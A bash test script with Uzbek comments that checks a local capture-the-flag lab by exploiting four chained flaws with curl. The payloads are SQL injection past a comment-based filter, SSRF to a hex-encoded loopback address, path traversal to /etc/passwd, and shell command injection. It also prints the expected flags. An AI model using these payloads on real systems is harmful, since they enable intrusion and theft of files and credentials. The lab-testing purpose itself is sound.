#!/usr/bin/env bash
# Orbit Ops (HARD) — 4 zanjirli zaiflikni to'liq attack-chain bilan tekshiradi.
# Ishlatish:  ./start-hard-ctf.sh &   so'ng:  ./test-hard-ctf.sh [PORT]
set -u
PORT="${1:-8086}"
T="http://127.0.0.1:${PORT}"
pass=0; fail=0
chk(){ if echo "$2" | grep -q "$1"; then echo "  [PASS] $3"; pass=$((pass+1)); else echo "  [FAIL] $3 -- got: $(echo "$2"|tr '\n' ' '|cut -c1-130)"; fail=$((fail+1)); fi; }

echo "### 1) Filtered UNION SQLi — /api/v1/node (/**/ bypass)"
chk "illegal token" "$(curl -s "$T/api/v1/node?id=1%20OR%201=1")" "naive '1 OR 1=1' -> WAF bloklaydi"
SQLI=$(curl -s -G "$T/api/v1/node" --data-urlencode "id=0/**/UNION/**/SELECT/**/label,secret/**/FROM/**/secrets")
chk "un10n_c0mment_byp4ss" "$SQLI" "UNION (/**/) -> SQLi flag"
TOKEN=$(echo "$SQLI" | grep -oE 'ORBIT-DEPLOY-[A-Z0-9-]+' | head -1)
echo "    deploy_token = $TOKEN"

echo "### 2) SSRF — /api/v1/fetch (hex-IP bypass) -> /internal/metrics"
chk "Blocked" "$(curl -s -G "$T/api/v1/fetch" --data-urlencode 'url=http://127.0.0.1/internal/metrics')" "127.0.0.1 bloklangan"
chk "Blocked" "$(curl -s -G "$T/api/v1/fetch" --data-urlencode 'url=http://2130706433/internal/metrics')" "decimal ham bloklangan"
chk "h3x_ip_ssrf_1nt3rn4l" "$(curl -s -G "$T/api/v1/fetch" --data-urlencode 'url=http://0x7f000001/internal/metrics')" "hex 0x7f000001 -> SSRF -> internal flag"

echo "### 3) LFI / path traversal — /internal/logs via SSRF"
chk "tr4v3rs3_2_0rb1t" "$(curl -s -G "$T/api/v1/fetch" --data-urlencode 'url=http://0x7f000001/internal/logs?file=../secret/deploy.cfg')" "../secret/deploy.cfg -> LFI flag"
chk "root:x:0:0" "$(curl -s -G "$T/api/v1/fetch" --data-urlencode 'url=http://0x7f000001/internal/logs?file=../../../../etc/passwd')" "../../../../etc/passwd -> (soxta) passwd"

echo "### 4) OS command injection — POST /api/v1/deploy (token-gated)"
chk "invalid deploy token" "$(curl -s -X POST "$T/api/v1/deploy" -d 'image=nginx')" "tokensiz -> 401"
chk "r00t_rce_d3pl0y" "$(curl -s -X POST "$T/api/v1/deploy" --data-urlencode "token=$TOKEN" --data-urlencode 'image=x; cat /root/flag.txt #')" "; cat /root/flag.txt # -> master flag"

echo ""
echo "### NATIJA: PASS=$pass  FAIL=$fail"
[ "$fail" -eq 0 ] && echo "✅ Hammasi joyida — 4 flag ham zanjir bilan olinadi." || echo "⚠️  Ba'zi testlar yiqildi."
